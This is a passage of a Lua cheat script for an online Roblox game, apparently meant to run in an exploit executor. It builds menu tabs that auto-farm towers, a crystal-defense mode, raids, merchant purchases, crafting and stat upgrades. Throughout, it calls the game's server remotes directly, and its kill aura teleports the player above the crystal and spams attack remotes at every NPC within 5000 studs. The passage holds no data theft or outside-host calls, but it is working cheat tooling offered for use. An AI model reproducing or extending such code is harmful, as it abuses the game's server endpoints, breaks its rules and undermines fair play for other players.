        Thread('AutoInfiniteTower', SafeLoop('Auto Infinite Tower', Func_AutoInfiniteTower), v)
    end,
})
InfiniteTowerTab_group = InfiniteTowerTab:AddGroup({Name = 'Auto Floor Reset'})
InfiniteTowerTab_group:AddSlider({
    Name = 'Reset at Floor',
    Min = 1,
    Max = 500,
    Default = 10,
    Flag = 'InfiniteTowerResetWave',
    Callback = function(v)
        Options.InfiniteTowerResetWave = v

        if Toggles.AutoInfiniteTowerWaveReset and Toggles.AutoInfiniteTowerWaveReset.Value then
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('SetAutoTowerReset'):FireServer(v)
            end)
            InfiniteTowerResetStatusLabel.Text = 'Status: Auto Reset updated to Wave ' .. v
        end
    end,
})

Options.InfiniteTowerResetWave = 10

local InfiniteTowerWaveLabel = InfiniteTowerTab_group:AddLabel({Text = 'Current Floor: Floor: Unknown'})

task.spawn(function()
    while true do
        task.wait(1)

        local waveText = 'Unknown'

        pcall(function()
            local frame = game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('DungeonUI')

            if not frame then
                return
            end

            local waveFrame = frame:FindFirstChild('ContentFrame', true)

            if not waveFrame then
                return
            end

            local holder = waveFrame:FindFirstChild('WaveFrame', true)

            if not holder then
                return
            end

            local label = holder:FindFirstChild('TotalWavesAndCurrentWaveYouAreAt', true)

            if label and label:IsA('TextLabel') then
                waveText = label.Text
            end
        end)

        if waveText == 'Unknown' then
            pcall(function()
                local dui = game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('DungeonUI')

                if not dui then
                    return
                end

                for _, obj in pairs(dui:GetDescendants())do
                    if obj:IsA('TextLabel') and obj.Name == 'TotalWavesAndCurrentWaveYouAreAt' then
                        waveText = obj.Text

                        break
                    end
                end
            end)
        end

        InfiniteTowerWaveLabel.Text = 'Floor: ' .. tostring(waveText)

        Shared.InfiniteTowerCurrentWave = waveText
    end
end)
InfiniteTowerTab_group:AddToggle({
    Name = 'Auto Floor Reset',
    Default = false,
    Flag = 'AutoInfiniteTowerWaveReset',
    Callback = function(v)
        Toggles.AutoInfiniteTowerWaveReset = {Value = v}

        local resetFloor = Options.InfiniteTowerResetWave or 10

        if v then
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('SetAutoTowerReset'):FireServer(resetFloor)
            end)
        else
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('SetAutoTowerReset'):FireServer(0)
            end)
        end
    end,
})

local CrystalTab = CreateNexusPage({Name = 'Crystal Defense'})
CrystalTab_group = CrystalTab:AddGroup({Name = 'Status'})
local CrystalHPLabel = CrystalTab_group:AddLabel({Text = 'Crystal HP: HP: Unknown'})

task.spawn(function()
    while true do
        task.wait(1)

        local hp, maxHP = 0, 0

        pcall(function()
            for _, obj in pairs(workspace:GetDescendants())do
                local crystalHP = obj:GetAttribute('CrystalHP')
                local maxCrystalHP = obj:GetAttribute('MaxCrystalHP') or obj:GetAttribute('CrystalMaxHP')

                if crystalHP then
                    hp = tonumber(crystalHP) or 0
                    maxHP = tonumber(maxCrystalHP) or 0

                    break
                end
            end
        end)

        if maxHP > 0 then
            local pct = math.floor((hp / maxHP) * 100)

            CrystalHPLabel.Text = 'Crystal HP: ' .. pct .. '% / 100%'
        else
            CrystalHPLabel.Text = 'Crystal HP: Unknown'
        end
    end
end)
CrystalTab_group = CrystalTab:AddGroup({Name = 'Settings'})
CrystalTab_group:AddMultiDropdown({
    Name = 'Select Weapon (Crystal Defense)',
    Options = Tables.Weapon,
    Default = {
        'Melee',
        'Sword',
    },
        Flag = 'CrystalDefenseWeaponType',
    Callback = function(v)
        local map = {}
        if type(v) == 'table' then
            for k, val in pairs(v)do
                if type(k) == 'number' then
                    map[val] = true
                else
                    map[k] = true
                end
            end
        else
            map[v] = true
        end
        Options.CrystalDefenseWeaponType = map
    end,
})
CrystalTab_group:AddMultiDropdown({
    Name = 'Select Skills to Use',
    Options = {
        'Z',
        'X',
        'C',
        'V',
        'F',
    },
    Default = {
        'V',
        'F',
    },
        Flag = 'CrystalKillAuraSkills',
    Callback = function(v)
        local map = {}
        if type(v) == 'table' then
            for k, val in pairs(v)do
                if type(k) == 'number' then
                    map[val] = true
                else
                    map[k] = true
                end
            end
        else
            map[v] = true
        end
        Options.CrystalKillAuraSkills = map
    end,
})

Options.CrystalKillAuraSkills = {
    Z = true,
    X = true,
    C = true,
    V = true,
}

CrystalTab_group:AddToggle({
    Name = 'Auto Start Crystal Defense',
    Default = false,
    Flag = 'AutoCrystalStart',
    Callback = function(v)
        Toggles.AutoCrystalStart = {Value = v}

        if v then
            task.spawn(function()
                pcall(function()
                    Remotes.OpenDungeon:FireServer('CrystalDefense', 'Normal')
                end)
                task.wait(1)
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('StartDungeonPortal'):FireServer()
                end)
                task.wait(0.5)
                pcall(function()
                    Remotes.StartDungeon:FireServer()
                end)
                task.wait(0.5)
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer('start')
                end)
                task.wait(1)
                TryEnterPortal()

                Toggles.AutoCrystalStart.Value = false
            end)
        end
    end,
})
CrystalTab_group:AddToggle({
    Name = 'Auto Replay Crystal Defense',
    Default = false,
    Flag = 'AutoCrystalReplay',
    Callback = function(v)
        Toggles.AutoCrystalReplay = {Value = v}

        Thread('CrystalDefense.Replay', SafeLoop('Crystal Replay', function()
            while Toggles.AutoCrystalReplay and Toggles.AutoCrystalReplay.Value do
                task.wait(2)

                local char = GetCharacter()
                local hum = char and char:FindFirstChildOfClass('Humanoid')

                if not char or not hum or hum.Health <= 0 then
                    task.wait(0.5)

                    continue
                end
                if #GetAllNPCTargets() == 0 then
                    pcall(function()
                        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveReplayVote'):FireServer('sponsor')
                    end)
                    task.wait(1)
                    pcall(function()
                        Remotes.StartDungeon:FireServer()
                    end)
                    task.wait(3)

                    if #GetAllNPCTargets() == 0 then
                        pcall(function()
                            Remotes.OpenDungeon:FireServer('CrystalDefense', 'Normal')
                        end)
                        task.wait(1)
                        pcall(function()
                            Remotes.StartDungeon:FireServer()
                        end)
                        task.wait(2)
                        TryEnterPortal()
                    end
                end
            end
        end), v)
    end,
})
CrystalTab_group:AddToggle({
    Name = 'Auto Defend Crystal (AFK)',
    Default = false,
    Flag = 'KillAuraInstant',
    Callback = function(v)
        Toggles.KillAuraInstant = {Value = v}

        if not v then
            Shared.CrystalLockPos = nil
        end

        Thread('KillAuraInstant', SafeLoop('Kill Aura Instant', function()
            local function GetCrystalPos()
                for _, obj in pairs(workspace:GetDescendants())do
                    if obj:GetAttribute('CrystalHP') or obj:GetAttribute('IsCrystal') then
                        local pos = nil

                        pcall(function()
                            pos = obj:GetPivot().Position
                        end)

                        if not pos then
                            local bp = obj:FindFirstChildOfClass('BasePart') or obj.PrimaryPart

                            if bp then
                                pos = bp.Position
                            end
                        end
                        if pos then
                            return pos
                        end
                    end
                end
                for _, obj in pairs(workspace:GetDescendants())do
                    if obj.Name:lower():find('crystal') then
                        local pos = nil

                        pcall(function()
                            pos = obj:GetPivot().Position
                        end)

                        if not pos and obj:IsA('BasePart') then
                            pos = obj.Position
                        end
                        if pos then
                            return pos
                        end
                    end
                end

                return nil
            end
            local function GetCrystalDefenseWeapon()
                local enabledTypes = Options.CrystalDefenseWeaponType or {Melee = true}
                local char = GetCharacter()
                local backpack = Players.LocalPlayer:FindFirstChild('Backpack')
                local containers = {}

                if backpack then
                    table.insert(containers, backpack)
                end
                if char then
                    table.insert(containers, char)
                end

                for _, container in ipairs(containers)do
                    for _, tool in ipairs(container:GetChildren())do
                        if tool:IsA('Tool') then
                            local toolType = GetToolTypeFromModule(tool.Name)

                            if enabledTypes[toolType] then
                                return tool.Name
                            end
                        end
                    end
                end

                return nil
            end
            local function EquipCrystalWeapon()
                local weapName = GetCrystalDefenseWeapon()

                if not weapName then
                    return
                end

                local char = GetCharacter()

                if not char then
                    return
                end
                if char:FindFirstChild(weapName) then
                    return
                end

                local hum = char:FindFirstChildOfClass('Humanoid')
                local backpack = Players.LocalPlayer:FindFirstChild('Backpack')

                if not hum or not backpack then
                    return
                end

                local tool = backpack:FindFirstChild(weapName)

                if not tool then
                    return
                end

                local current = char:FindFirstChildOfClass('Tool')

                if current then
                    pcall(function()
                        hum:UnequipTools()
                    end)
                    task.wait(0.05)
                end

                pcall(function()
                    hum:EquipTool(tool)
                end)
            end
            local function FireSelectedSkills()
                local char = GetCharacter()
                local tool = char and char:FindFirstChildOfClass('Tool')

                if not tool then
                    return
                end

                local keyToSlot = {
                    Z = 1,
                    X = 2,
                    C = 3,
                    V = 4,
                    F = 5,
                }
                local keyToEnum = {
                    Z = Enum.KeyCode.Z,
                    X = Enum.KeyCode.X,
                    C = Enum.KeyCode.C,
                    V = Enum.KeyCode.V,
                    F = Enum.KeyCode.F,
                }
                local toolType = GetToolTypeFromModule(tool.Name)
                local selectedSkills = Options.CrystalKillAuraSkills or {
                    V = true,
                    F = true,
                }

                for _, key in ipairs({
                    'Z',
                    'X',
                    'C',
                    'V',
                    'F',
                })do
                    if not selectedSkills[key] then
                        continue
                    end

                    pcall(function()
                        if toolType == 'Power' then
                            Remotes.UseFruit:FireServer('UseAbility', {
                                FruitPower = tool.Name:gsub(' Fruit', ''),
                                KeyCode = keyToEnum[key],
                            })
                        else
                            Remotes.UseSkill:FireServer(keyToSlot[key])
                        end
                    end)
                end
            end

            while Toggles.KillAuraInstant and Toggles.KillAuraInstant.Value do
                task.wait(0.05)

                local char = GetCharacter()
                local root = char and char:FindFirstChild('HumanoidRootPart')

                if not root then
                    task.wait(0.1)

                    continue
                end

                local crystalPos = GetCrystalPos()

                if crystalPos then
                    if not Shared.CrystalLockPos then
                        Shared.CrystalLockPos = crystalPos + Vector3.new(0, 20, 0)
                    end

                    pcall(function()
                        root.CFrame = CFrame.new(Shared.CrystalLockPos)
                        root.AssemblyLinearVelocity = Vector3.zero
                        root.AssemblyAngularVelocity = Vector3.zero
                    end)
                else
                    Shared.CrystalLockPos = nil
                end
                if not Shared._LastCrystalWeapEquip or tick() - Shared._LastCrystalWeapEquip >= 4 then
                    EquipCrystalWeapon()

                    Shared._LastCrystalWeapEquip = tick()
                end

                local range = 5000
                local folders = {
                    PATH.Mobs,
                    workspace:FindFirstChild('DungeonSpawns'),
                    workspace:FindFirstChild('NPCs'),
                }

                for _, folder in pairs(folders)do
                    if not folder then
                        continue
                    end

                    for _, npc in pairs(folder:GetChildren())do
                        if not npc:IsA('Model') then
                            continue
                        end

                        local isPlayer = false

                        for _, p in pairs(Players:GetPlayers())do
                            if p.Character == npc then
                                isPlayer = true

                                break
                            end
                        end

                        if isPlayer then
                            continue
                        end

                        local hum = npc:FindFirstChildOfClass('Humanoid')
                        local npcRoot = npc:FindFirstChild('HumanoidRootPart')

                        if not hum or not npcRoot then
                            continue
                        end

                        local bossHP = npc:GetAttribute('_BossHP') or npc:GetAttribute('BossHP')
                        local isAlive = (hum.Health > 0) or (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0)

                        if not isAlive then
                            continue
                        end

                        local dist = (root.Position - npcRoot.Position).Magnitude

                        if dist > range then
                            continue
                        end

                        Shared.Target = npc
                        Shared.TargetValid = true
                        Shared.LastM1 = time()

                        for i = 1, 3 do
                            pcall(function()
                                Remotes.M1:FireServer()
                            end)
                        end
                    end
                end

                FireSelectedSkills()
            end
        end), v)
    end,
})
CrystalTab_group = CrystalTab:AddGroup({Name = 'Auto Wave Reset'})
CrystalTab_group:AddSlider({
    Name = 'Reset at Wave',
    Min = 1,
    Max = 200,
    Default = 10,
    Flag = 'CrystalResetWave',
    Callback = function(v)
        Options.CrystalResetWave = v

        if Toggles.AutoCrystalWaveReset and Toggles.AutoCrystalWaveReset.Value then
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('SetAutoTowerReset'):FireServer(v)
            end)
            CrystalResetStatusLabel.Text = 'Status: Auto Reset updated to Wave ' .. v
        end
    end,
})

Options.CrystalResetWave = 10

local CrystalWaveLabel = CrystalTab_group:AddLabel({Text = 'Current Wave: Wave: Unknown'})
local CrystalResetStatusLabel = CrystalTab_group:AddLabel({Text = 'Reset Status: Status: Idle'})

task.spawn(function()
    while true do
        task.wait(1)

        local waveText = 'Unknown'

        pcall(function()
            local frame = game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('DungeonUI')

            if not frame then
                return
            end

            local waveFrame = frame:FindFirstChild('ContentFrame', true)

            if not waveFrame then
                return
            end

            local holder = waveFrame:FindFirstChild('WaveFrame', true)

            if not holder then
                return
            end

            local label = holder:FindFirstChild('TotalWavesAndCurrentWaveYouAreAt', true)

            if label and label:IsA('TextLabel') then
                waveText = label.Text
            end
        end)

        if waveText == 'Unknown' then
            pcall(function()
                local dui = game:GetService('Players').LocalPlayer.PlayerGui:FindFirstChild('DungeonUI')

                if not dui then
                    return
                end

                for _, obj in pairs(dui:GetDescendants())do
                    if obj:IsA('TextLabel') and obj.Name == 'TotalWavesAndCurrentWaveYouAreAt' then
                        waveText = obj.Text

                        break
                    end
                end
            end)
        end

        CrystalWaveLabel.Text = 'Wave: ' .. tostring(waveText)

        Shared.CrystalCurrentWave = waveText
    end
end)
CrystalTab_group:AddToggle({
    Name = 'Auto Wave Reset',
    Default = false,
    Flag = 'AutoCrystalWaveReset',
    Callback = function(v)
        Toggles.AutoCrystalWaveReset = {Value = v}

        local resetFloor = Options.CrystalResetWave or 10

        if v then
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('SetAutoTowerReset'):FireServer(resetFloor)
            end)
            CrystalResetStatusLabel.Text = 'Status: Auto Reset set to Wave ' .. resetFloor
        else
            pcall(function()
                game:GetService('ReplicatedStorage'):WaitForChild('RemoteEvents'):WaitForChild('SetAutoTowerReset'):FireServer(0)
            end)
            CrystalResetStatusLabel.Text = 'Status: Disabled'
        end
    end,
})

local Minotourpage = CreateNexusPage({Name = 'Minotaur Raid'})
Minotourpage_group = Minotourpage:AddGroup({Name = 'Minotaur Raid'})
Minotourpage_group:AddDropdown({
    Name = 'Difficulty',
    Options = MinotaurDiffList,
    Default = 'Easy',
    Flag = 'SelectedMinotaurDiff',
    Callback = function(v)
        Options.SelectedMinotaurDiff = v
    end,
})

local MinoBossStatusLabel2 = Minotourpage_group:AddLabel({Text = 'Minotaur: Not Found'})

task.spawn(function()
    while true do
        task.wait(1)
        local boss = FindMinoBoss()
        if boss then
            local hum = boss:FindFirstChildOfClass('Humanoid')
            local hp = hum and math.floor(hum.Health) or 0
            local maxhp = hum and math.floor(hum.MaxHealth) or 0
            MinoBossStatusLabel2.Text = 'Status: Found | HP: ' .. hp .. ' / ' .. maxhp
        else
            MinoBossStatusLabel2.Text = 'Status: Not Found'
        end
    end
end)

Minotourpage_group:AddToggle({
    Name = 'Auto Join Raid',
    Default = false,
    Flag = 'AutoMinotaurVoteStart',
    Callback = function(v)
        Toggles.AutoMinotaurVoteStart = {Value = v}
        Thread('Minotaur.VoteStart', SafeLoop('Mino Vote Start', Func_MinotaurVoteStart), v)
    end,
})
Minotourpage_group:AddToggle({
    Name = 'Auto Start Raid',
    Default = false,
    Flag = 'AutoMinotaurStart',
    Callback = function(v)
        Toggles.AutoMinotaurStart = {Value = v}
    end,
})

Toggles.AutoMinotaurStart = {Value = true}

Minotourpage_group:AddToggle({
    Name = 'Auto Replay',
    Default = false,
    Flag = 'AutoMinotaurRaidReplay',
    Callback = function(v)
        Toggles.AutoMinotaurRaidReplay = {Value = v}
    end,
})

Toggles.AutoMinotaurRaidReplay = {Value = true}

Minotourpage_group:AddToggle({
    Name = 'Auto Pull Lever',
    Default = false,
    Flag = 'AutoPullLever',
    Callback = function(v)
        Toggles.AutoPullLever = {Value = v}
        if not Support.Proximity then
            UI:Notify({
                Title = 'Error',
                Description = 'fireproximityprompt not supported by your executor!',
                Duration = 4,
            })
            Toggles.AutoPullLever.Value = false
            return
        end
        Thread('AutoPullLever', SafeLoop('Auto Pull Lever', Func_AutoPullLever), v)
    end,
})
Minotourpage_group:AddToggle({
    Name = 'Auto Farm Minotaur Raid',
    Default = false,
    Flag = 'AutoMinotaurRaid',
    Callback = function(v)
        Toggles.AutoMinotaurRaid = {Value = v}
        Thread('AutoMinotaurRaid', SafeLoop('Auto Minotaur Raid', Func_AutoMinotaurRaid), v)
    end,
})


local ChestCraftTab = CreateNexusPage({Name = 'Merchant & Chest'})

ChestCraftTab_group = ChestCraftTab:AddGroup({Name = 'Auto Merchant'})

local MerchantTimerLabel = ChestCraftTab_group:AddLabel({Text = 'Merchant: Refresh: N/A'})

ChestCraftTab_group:AddMultiDropdown({
    Name = 'Select Merchant Item(s)',
    Options = Tables.MerchantList,
    Default = {},
        Flag = 'SelectedMerchantItems',
    Callback = function(v)
        Options.SelectedMerchantItems = ToSet(v)
    end,
})
ChestCraftTab_group:AddToggle({
    Name = 'Auto Buy Merchant',
    Default = false,
    Flag = 'AutoMerchant',
    Callback = function(v)
        Toggles.AutoMerchant = {Value = v}
        Shared.MerchantBusy = v

        Thread('AutoMerchant', SafeLoop('Merchant', Func_AutoMerchant), v)
    end,
})

function FormatSecondsToTimer(s)
    return string.format('Refresh: %02d:%02d', math.floor(s / 60), s % 60)
end
function Func_AutoMerchant()
    local MerchUI = PGui:WaitForChild('MerchantUI')
    local Holder = MerchUI:FindFirstChild('Holder', true)
    local LastTimerText = ''

    function StartPurchaseSequence()
        if Shared.MerchantExecute then
            return
        end

        Shared.MerchantExecute = true

        if Shared.FirstMerchantSync then
            MerchUI.Enabled = true
            MerchUI.MainFrame.Visible = true

            task.wait(0.5)

            local close = MerchUI:FindFirstChild('CloseButton', true)

            if close then
                gsc(close)
                task.wait(1.8)
            end
        end

        OpenMerchantInterface()
        task.wait(2)

        local withStock = {}

        for _, child in pairs(Holder:GetChildren())do
            if child:IsA('Frame') and child.Name ~= 'Item' then
                local lbl = child:FindFirstChild('StockAmountForThatItem', true)
                local stock = lbl and tonumber(lbl.Text:match('%d+')) or 0

                Shared.CurrentStock[child.Name] = stock

                if stock > 0 then
                    table.insert(withStock, {
                        Name = child.Name,
                        Stock = stock,
                    })
                end
            end
        end

        local sel = Options.SelectedMerchantItems or {}

        for _, item in ipairs(withStock)do
            if sel[item.Name] then
                pcall(function()
                    Remotes.MerchantBuy:InvokeServer(item.Name, 99)
                end)
                task.wait(math.random(11, 17) / 10)
            end
        end

        if MerchUI.MainFrame then
            MerchUI.MainFrame.Visible = false
        end

        Shared.FirstMerchantSync = true
        Shared.MerchantExecute = false
    end
    function SyncClock()
        OpenMerchantInterface()
        task.wait(1)

        local lbl = MerchUI:FindFirstChild('RefreshTimerLabel', true)

        if lbl and lbl.Text:find(':') then
            local s = GetSecondsFromTimer(lbl.Text)

            if s then
                Shared.LocalMerchantTime = s
            end
        end
        if MerchUI.MainFrame then
            MerchUI.MainFrame.Visible = false
        end
    end

    SyncClock()

    while Toggles.AutoMerchant and Toggles.AutoMerchant.Value do
        local lbl = MerchUI:FindFirstChild('RefreshTimerLabel', true)

        if lbl and lbl.Text ~= '' then
            local s = GetSecondsFromTimer(lbl.Text)

            if s then
                Shared.LocalMerchantTime = s

                if lbl.Text ~= LastTimerText then
                    LastTimerText = lbl.Text
                    Shared.LastTimerTick = tick()
                end
            else
                Shared.LocalMerchantTime = math.max(0, Shared.LocalMerchantTime - 1)
            end
        else
            Shared.LocalMerchantTime = math.max(0, Shared.LocalMerchantTime - 1)
        end

        MerchantTimerLabel.Text = FormatSecondsToTimer(Shared.LocalMerchantTime)

        if not Shared.FirstMerchantSync or Shared.LocalMerchantTime <= 1 or Shared.LocalMerchantTime >= 1799 then
            task.spawn(StartPurchaseSequence)
        end
        if tick() - Shared.LastTimerTick > 30 then
            task.spawn(SyncClock)

            Shared.LastTimerTick = tick()
        end

        task.wait(1)
    end
end

ChestCraftTab_group = ChestCraftTab:AddGroup({Name = 'Auto Relic Craft'})
ChestCraftTab_group:AddMultiDropdown({
    Name = 'Select Relic(s) to Craft',
    Options = Tables.RelicList,
    Default = {},
        Flag = 'SelectedRelics',
    Callback = function(v)
        Options.SelectedRelics = ToSet(v)
    end,
})
ChestCraftTab_group:AddSlider({
    Name = 'Craft Delay (seconds)',
    Min = 0.5,
    Max = 5,
    Default = 1.5,
    Flag = 'RelicCraftCD',
    Callback = function(v)
        Options.RelicCraftCD = v
    end,
})
ChestCraftTab_group:AddButton({
    Name = 'Craft Selected Once',
    Callback = function()
        local selected = Options.SelectedRelics or {}
        local count = 0

        for _, relicName in ipairs(Tables.RelicList)do
            if selected[relicName] then
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('RequestRelicCraft'):InvokeServer(relicName)
                end)

                count = count + 1

                task.wait(Options.RelicCraftCD or 1.5)
            end
        end
    end,
})
ChestCraftTab_group:AddToggle({
    Name = 'Auto Craft Relic',
    Default = false,
    Flag = 'AutoRelicCraft',
    Callback = function(v)
        Toggles.AutoRelicCraft = {Value = v}

        Thread('AutoRelicCraft', SafeLoop('Relic Craft', Func_AutoRelicCraft), v)
    end,
})
ChestCraftTab_group = ChestCraftTab:AddGroup({Name = 'Auto Open Chests'})
ChestCraftTab_group:AddMultiDropdown({
    Name = 'Select Chest(s)',
    Options = Tables.Rarities,
    Default = {},
        Flag = 'SelectedChests',
    Callback = function(v)
        Options.SelectedChests = ToSet(v)
    end,
})
ChestCraftTab_group:AddToggle({
    Name = 'Auto Open Chest',
    Default = false,
    Flag = 'AutoChest',
    Callback = function(v)
        Toggles.AutoChest = {Value = v}

        Thread('AutoChest', SafeLoop('Chest', Func_AutoChest), v)
    end,
})
ChestCraftTab_group = ChestCraftTab:AddGroup({Name = 'Auto Craft'})
ChestCraftTab_group:AddMultiDropdown({
    Name = 'Select Item(s) to Craft',
    Options = Tables.CraftItemList,
    Default = {},
        Flag = 'SelectedCraftItems',
    Callback = function(v)
        Options.SelectedCraftItems = ToSet(v)
    end,
})
ChestCraftTab_group:AddToggle({
    Name = 'Auto Craft Item',
    Default = false,
    Flag = 'AutoCraftItem',
    Callback = function(v)
        Toggles.AutoCraftItem = {Value = v}

        Thread('AutoCraft', SafeLoop('Craft', Func_AutoCraft), v)
    end,
})

local UpgradeTab = CreateNexusPage({Name = 'Auto Upgrade'})

UpgradeTab_group = UpgradeTab:AddGroup({Name = 'Upgrade Config'})
UpgradeTab_group:AddSlider({
    Name = 'Upgrade Delay (seconds)',
    Min = 0.1,
    Max = 3,
    Default = 0.5,
    Flag = 'UpgradeCD',
    Callback = function(v)
        Options.UpgradeCD = v
    end,
})
UpgradeTab_group = UpgradeTab:AddGroup({Name = 'Infinite Tower'})
UpgradeTab_group:AddMultiDropdown({
    Name = 'Select Stats [Tower]',
    Options = {
        'Damage',
        'CritDamage',
        'CritChance',
        'HP',
        'Luck',
    },
    Default = {},
        Flag = 'SelectedTowerStats',
    Callback = function(v)
        Options.SelectedTowerStats = ToSet(v)
    end,
})
UpgradeTab_group:AddButton({
    Name = 'Upgrade Once [Tower]',
    Callback = function()
        local remote = UpgradeRemotes.InfiniteTower

        if not remote then
            UI:Notify({
                Title = 'Error',
                Description = 'Remote not found!',
                Duration = 3,
            })

            return
        end

        local selected = Options.SelectedTowerStats or {}
        local statList = {
            'Damage',
            'CritDamage',
            'CritChance',
            'HP',
            'Luck',
        }

        task.spawn(function()
            for _, stat in ipairs(statList)do
                if selected[stat] then
                    pcall(function()
                        remote:InvokeServer(stat)
                    end)
                    task.wait(Options.UpgradeCD or 0.5)
                end
            end
        end)
    end,
})
UpgradeTab_group:AddToggle({
    Name = 'Auto Upgrade [Tower]',
    Default = false,
    Flag = 'AutoTowerUpgrade',
    Callback = function(v)
        Toggles.AutoTowerUpgrade = {Value = v}

        Thread('AutoTowerUpgrade', SafeLoop('Tower Upgrade', Func_AutoTowerUpgrade), v)
    end,
})
UpgradeTab_group = UpgradeTab:AddGroup({Name = 'Boss Rush'})
UpgradeTab_group:AddMultiDropdown({
    Name = 'Select Stats [Boss Rush]',
    Options = {
        'Damage',
        'CritDamage',
        'CritChance',
        'HP',
        'Luck',
    },
    Default = {},
        Flag = 'SelectedBossRushStats',
    Callback = function(v)
        Options.SelectedBossRushStats = ToSet(v)
    end,
})
UpgradeTab_group:AddButton({
    Name = 'Upgrade Once [Boss Rush]',
    Callback = function()
        local remote = UpgradeRemotes.BossRush

        if not remote then
            UI:Notify({
                Title = 'Error',
                Description = 'Remote not found!',
                Duration = 3,
            })

            return
        end

        local selected = Options.SelectedBossRushStats or {}
        local statList = {
            'Damage',
            'CritDamage',
            'CritChance',
            'HP',
            'Luck',
        }

        task.spawn(function()
            for _, stat in ipairs(statList)do
                if selected[stat] then
                    pcall(function()
                        remote:InvokeServer(stat)
                    end)
                    task.wait(Options.UpgradeCD or 0.5)
                end
            end
        end)
    end,
})
UpgradeTab_group:AddToggle({
    Name = 'Auto Upgrade [Boss Rush]',
    Default = false,
    Flag = 'AutoBossRushUpgrade',
    Callback = function(v)
        Toggles.AutoBossRushUpgrade = {Value = v}

        Thread('AutoBossRushUpgrade', SafeLoop('BossRush Upgrade', Func_AutoBossRushUpgrade), v)
    end,
})
UpgradeTab_group = UpgradeTab:AddGroup({Name = 'Crystal Defense'})
UpgradeTab_group:AddMultiDropdown({
    Name = 'Select Stats [Crystal]',
    Options = {
        'Damage',
        'CritDamage',
        'CritChance',
        'HP',
        'Luck',
    },
    Default = {},
        Flag = 'SelectedCrystalStats',
    Callback = function(v)
        Options.SelectedCrystalStats = ToSet(v)
    end,
})
UpgradeTab_group:AddButton({
    Name = 'Upgrade Once [Crystal]',
    Callback = function()
        local remote = UpgradeRemotes.CrystalDefense

        if not remote then
            UI:Notify({
                Title = 'Error',
                Description = 'Remote not found!',
                Duration = 3,
            })

            return
        end

        local selected = Options.SelectedCrystalStats or {}
        local statList = {
            'Damage',
            'CritDamage',
            'CritChance',
            'HP',
            'Luck',
        }

        task.spawn(function()
            for _, stat in ipairs(statList)do
                if selected[stat] then
                    pcall(function()
                        remote:InvokeServer(stat)
                    end)
                    task.wait(Options.UpgradeCD or 0.5)
                end
            end
        end)
    end,
})
UpgradeTab_group:AddToggle({
    Name = 'Auto Upgrade [Crystal Defense]',
    Default = false,
    Flag = 'AutoCrystalDefenseUpgrade',
    Callback = function(v)
        Toggles.AutoCrystalDefenseUpgrade = {Value = v}

        Thread('AutoCrystalDefenseUpgrade', SafeLoop('Crystal Upgrade', Func_AutoCrystalDefenseUpgrade), v)
    end,
})
UpgradeTab_group = UpgradeTab:AddGroup({Name = 'Easter Event'})
UpgradeTab_group:AddMultiDropdown({
    Name = 'Select Stats [Easter]',
    Options = {
        'EggDropChance',
        'EggChance',
        'EasterBossLuck',
    },
    Default = {},
        Flag = 'SelectedEasterStats',
    Callback = function(v)
        Options.SelectedEasterStats = ToSet(v)
    end,
})
UpgradeTab_group:AddButton({
    Name = 'Upgrade Once [Easter]',
    Callback = function()
        local remote = UpgradeRemotes.Easter

        if not remote then
            UI:Notify({
                Title = 'Error',
                Description = 'Remote not found!',
                Duration = 3,
            })

            return
        end

        task.spawn(function()
            local sel = Options.SelectedEasterStats or {}
            local easterStats = {
                EggDropChance = {
                    'EggDropChance',
                    'EGG_DROP_CHANCE',
                    'eggDropChance',
                },
                EggChance = {
                    'EggChance',
                    'EGG_CHANCE',
                    'eggChance',
                    'ExtraEgg',
                },
                EasterBossLuck = {
                    'EasterBossLuck',
                    'EASTER_BOSS_LUCK',
                    'BossLuck',
                },
            }

            for displayName, variants in pairs(easterStats)do
                if sel[displayName] then
                    for _, v in ipairs(variants)do
                        local ok = pcall(function()
                            remote:InvokeServer(v)
                        end)

                        if ok then
                            break
                        end
                    end

                    task.wait(Options.UpgradeCD or 0.5)
                end
            end
        end)
    end,
})
UpgradeTab_group:AddToggle({
    Name = 'Auto Upgrade [Easter]',
    Default = false,
    Flag = 'AutoEasterUpgrade',
    Callback = function(v)
        Toggles.AutoEasterUpgrade = {Value = v}

        Thread('AutoEasterUpgrade', SafeLoop('Easter Upgrade', Func_AutoEasterUpgrade), v)
    end,
})

local abilitises = CreateNexusPage({Name = "Haki's"})
abilitises_group = abilitises:AddGroup({Name = "Haki's"})

abilitises_group:AddToggle({
    Name = 'Auto Armament Haki',
    Default = false,
    Flag = 'AutoArmHaki',
    Callback = function(v)
        Toggles.AutoArmHaki = v

        if v then
            task.spawn(Func_AutoArmHaki)
        end
    end,
})
abilitises_group:AddToggle({
    Name = 'Auto Observation Haki',
    Default = false,
    Flag = 'AutoObsHaki',
    Callback = function(v)
        Toggles.AutoObsHaki = v

        if v then
            task.spawn(Func_AutoObsHaki)
        end
    end,
})
abilitises_group:AddToggle({
    Name = 'Auto Get Conqueror Haki (Full)',
    Default = false,
    Flag = 'AutoGetConquerorHaki',
    Callback = function(v)
        Toggles.AutoGetConquerorHaki = {Value = v}

        Thread('AutoGetConquerorHaki', SafeLoop('Auto Get Conqueror Haki', Func_AutoGetConquerorHaki), v)
    end,
})

local fightingstyle = CreateNexusPage({Name = 'Fighting Style'})

fightingstyle_group = fightingstyle:AddGroup({Name = 'Gojo Style'})
fightingstyle_group:AddToggle({
    Name = 'Auto Get Gojo Items',
    Default = false,
    Flag = 'AutoGojoGetItems',
    Callback = function(v)
        Toggles.AutoGojoGetItems = {Value = v}

        Thread('Styles.GojoGetItems', SafeLoop('Gojo Get Items', Func_AutoGojoGetItems), v)
    end,
})
